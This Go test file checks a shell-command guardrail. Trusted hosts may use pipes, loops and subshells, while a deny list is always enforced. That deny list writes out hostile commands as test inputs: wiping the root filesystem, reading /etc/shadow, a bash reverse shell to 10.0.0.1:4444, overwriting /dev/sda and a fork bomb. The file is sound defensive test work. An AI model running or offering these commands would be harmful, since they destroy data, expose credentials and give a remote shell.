package policy

import "testing"

func TestResolvedPolicyTrustedPropagates(t *testing.T) {
	p := &Policy{Hosts: map[string]HostPolicy{
		"box":  {Hostname: "192.0.2.1", Trusted: true},
		"safe": {Hostname: "192.0.2.2"},
	}}
	if !p.ResolvedPolicy("box").Trusted {
		t.Error("trusted flag did not propagate for box")
	}
	if p.ResolvedPolicy("safe").Trusted {
		t.Error("safe host should not be trusted")
	}
	if got := p.TrustedHosts(); len(got) != 1 || got[0] != "box" {
		t.Errorf("TrustedHosts() = %v, want [box]", got)
	}
}

// trusted hosts run through guardrail with operators on: full shell, minus the
// always-on hard-denies and obfuscation rejection.
func TestTrustedModeFullShellButGuarded(t *testing.T) {
	hp := HostPolicy{AllowShellOperators: true}
	allowed := []string{
		`ls | grep foo`,
		`echo $(date)`,
		`cat access.log && tail -n5 err.log`,
		`for i in 1 2 3; do echo $i; done`,
		`df -h | awk '{print $5}'`,
	}
	for _, cmd := range allowed {
		if r := ValidateCommand(cmd, hp, ModeGuardrail); !r.Allowed {
			t.Errorf("trusted should allow %q, denied: %s", cmd, r.Reason)
		}
	}
	stillDenied := []string{
		`rm -rf /`,
		`cat /etc/shadow`,
		`bash -i >& /dev/tcp/10.0.0.1/4444`,
		`echo x > /dev/sda`,
		`:(){ :|:& };:`,
	}
	for _, cmd := range stillDenied {
		if r := ValidateCommand(cmd, hp, ModeGuardrail); r.Allowed {
			t.Errorf("trusted must still deny %q, got allowed", cmd)
		}
	}
}
